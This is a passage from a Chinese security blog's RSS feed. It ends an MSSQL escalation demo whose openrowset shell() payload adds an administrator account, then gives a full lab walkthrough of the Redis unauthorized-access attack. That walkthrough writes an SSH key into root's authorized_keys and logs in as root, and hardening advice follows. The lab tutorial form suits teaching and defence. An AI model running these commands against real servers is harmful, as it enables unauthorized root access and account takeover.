class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--执行系统命令select * from openrowset(&amp;#x27;microsoft.jet.oledb.4.0&amp;#x27;,&amp;#x27;;database=c:/windows/system32/ias/ias.mdb&amp;#x27;,&amp;#x27;select shell(&amp;quot;net user HeyJack2 HeyJack2 /add&amp;quot;)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; openrowset(&lt;span class=&#34;string&#34;&gt;&amp;#x27;microsoft.jet.oledb.4.0&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;;database=c:/windows/system32/ias/ias.mdb&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;select shell(&amp;quot;net localgroup administrators HeyJack2 /add&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;沙盒模式 SandBoxMode 参数含义（默认是 2）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0&lt;/code&gt; ：在任何所有者中禁止启用安全模式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&lt;/code&gt;  ：为仅在允许范围内&lt;/p&gt;
&lt;p&gt;&lt;code&gt;2&lt;/code&gt;  ：必须在 access 模式下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;3&lt;/code&gt; ：完全开启&lt;/p&gt;
&lt;p&gt;openrowset 是可以通过 OLE DB 访问 SQL Server 数据库，OLE DB 是应用程序链接到 SQL Server 的的驱动程序。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--恢复配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_regwrite &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;REG_DWORD&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ad Hoc Distributed Queries&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，SQL Server (MSSQL) 提权攻击演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</guid>
            <title>Redis提权攻击</title>
            <link>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</link>
            <category>数据库安全</category>
            <pubDate>Tue, 27 Sep 2022 00:02:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;Redis&lt;/strong&gt;（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI &lt;a href=&#34;https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80&#34;&gt;C 语言&lt;/a&gt;编写、支持网络、可基于内存亦可持久化的日志型、Key-Value&lt;a href=&#34;https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728&#34;&gt; 数据库&lt;/a&gt;，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由&lt;a href=&#34;https://baike.baidu.com/item/Pivotal&#34;&gt; Pivotal&lt;/a&gt; 赞助。&lt;/p&gt;
&lt;h2 id=&#34;0x00-redis提权攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x00-redis提权攻击&#34;&gt;#&lt;/a&gt; 0x00 Redis 提权攻击&lt;/h2&gt;
&lt;p&gt;​	&lt;strong&gt;Redis&lt;/strong&gt; 在默认情况下，会绑定在 0.0.0.0:&lt;strong&gt;6379&lt;/strong&gt; 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 &lt;code&gt;暴露到公网&lt;/code&gt; 上。&lt;/p&gt;
&lt;p&gt;​	如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。&lt;/p&gt;
&lt;p&gt;​	攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 &lt;code&gt;/root/.ssh&lt;/code&gt;  文件夹的 &lt;code&gt;authotrized_keys&lt;/code&gt;  文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;目标靶机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Ubuntu18.04&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.143&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;攻击主机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Kali2022&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.145&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如果没有攻击机没有安装 ssh 则：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install openssh-server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启动ssh服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo service ssh start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-被攻击机部分准备工作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-被攻击机部分准备工作&#34;&gt;#&lt;/a&gt; 0x01 被攻击机部分准备工作&lt;/h2&gt;
&lt;p&gt;在 Ubuntu 安装 redis 服务器&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install redis-server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212305161.png&#34; alt=&#34;image-20220926212305161&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改 /etc/redis/redis.conf，总共有三点：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212807655.png&#34; alt=&#34;image-20220926212807655&#34;&gt;&lt;/p&gt;
&lt;p&gt;①去除 bind&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213107025.png&#34; alt=&#34;image-20220926213107025&#34;&gt;&lt;/p&gt;
&lt;p&gt;②daemonize yes&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213521318.png&#34; alt=&#34;image-20220926213521318&#34;&gt;&lt;/p&gt;
&lt;p&gt;③protected-mode no&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232253189.png&#34; alt=&#34;image-20220926232253189&#34;&gt;&lt;/p&gt;
&lt;p&gt;重启服务&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service redis stop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;以root身份启动redis服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo redis-server /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;尝试在服务器上自己连一下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(显示127.0.0.1:6379则OK)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232522408.png&#34; alt=&#34;image-20220926232522408&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x02-攻击机部分准备工作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-攻击机部分准备工作&#34;&gt;#&lt;/a&gt; 0x02 攻击机部分准备工作&lt;/h2&gt;
&lt;p&gt;在攻击机上生成 rsa 秘钥&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214148985.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;重定向到 key.txt&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /home/kali/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(echo -e &amp;quot;\n\n&amp;quot;; cat id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; key.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214549834.png&#34; alt=&#34;image-20220926214549834&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214811675.png&#34; alt=&#34;image-20220926214811675&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后，我们在攻击机（也就是我的 kali）上安装 redis-cli&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://download.redis.io/redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxf redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进入到 redis-stable 目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd redis-stable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;拷贝&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cp ./src/redis-cli /usr/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220032721.png&#34; alt=&#34;image-20220926220032721&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现如下字样就说明安装成功：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;回车&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220238790.png&#34; alt=&#34;image-20220926220238790&#34;&gt;&lt;/p&gt;
&lt;p&gt;将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220116946.png&#34; alt=&#34;image-20220926220116946&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-开始攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-开始攻击&#34;&gt;#&lt;/a&gt; 0x03 开始攻击&lt;/h2&gt;
&lt;p&gt;拿到 redis 的 shell 后基本操作：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;info  #查看redis的信息和服务器信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flushall 删除全部数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del key  删除键为key的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get key  得到参数key的数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926234426901.png&#34; alt=&#34;image-20220926234426901&#34;&gt;&lt;/p&gt;
&lt;p&gt;在我们的攻击机 (kali) 上运行如下代码：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;看到回显了OK以后&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli -h 192.168.138.143进入shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926222112479.png&#34; alt=&#34;image-20220926222112479&#34;&gt;&lt;/p&gt;
&lt;p&gt;将目录切换到 /root/.ssh&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926231146929.png&#34; alt=&#34;image-20220926231146929&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232746706.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后，回到生成秘钥的终端：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用ssh命令 以root用户的身份 连接“被攻击机”的ip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.138.143&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232832651.png&#34; alt=&#34;image-20220926232832651&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，redis 提权攻击完成。&lt;/p&gt;
&lt;h2 id=&#34;0x04-修复建议安全加固&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-修复建议安全加固&#34;&gt;#&lt;/a&gt; 0x04 修复建议 / 安全加固&lt;/h2&gt;
&lt;h3 id=&#34;1禁止一些高危命令重启redis才能生效&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1禁止一些高危命令重启redis才能生效&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 禁止一些高危命令&lt;/strong&gt; (重启 redis 才能生效)&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者另起名字&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name2&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name3&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来禁用远程修改 DB 文件地址&lt;/p&gt;
&lt;h3 id=&#34;2以低权限运行-redis-服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2以低权限运行-redis-服务&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 以低权限运行 Redis 服务&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;groupadd -r redis &amp;amp;&amp;amp; useradd -r -g redis redis&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3为-redis-添加密码验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3为-redis-添加密码验证&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3. 为 Redis 添加密码验证&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;requirepass&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;mypassword&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4禁止外网访问-redis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4禁止外网访问-redis&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4. 禁止外网访问 Redis&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;bind&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;::1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。&lt;/p&gt;
&lt;h3 id=&#34;5保证-authorized_keys-文件的安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5保证-authorized_keys-文件的安全&#34;&gt;#&lt;/a&gt; &lt;strong&gt;5. 保证 authorized_keys 文件的安全&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;为了保证安全，您应该阻止其他用户添加新的公钥。&lt;/p&gt;
&lt;p&gt;将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 400 ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;注意:&lt;/strong&gt; 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。&lt;/p&gt;
&lt;h3 id=&#34;6修改默认端口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6修改默认端口&#34;&gt;#&lt;/a&gt; &lt;strong&gt;6. 修改默认端口&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件， 找到并修改原来的 &lt;code&gt;port 6379&lt;/code&gt;  ，比如改成 &lt;code&gt;port 17033&lt;/code&gt; ，让人摸不着头脑。&lt;/p&gt;
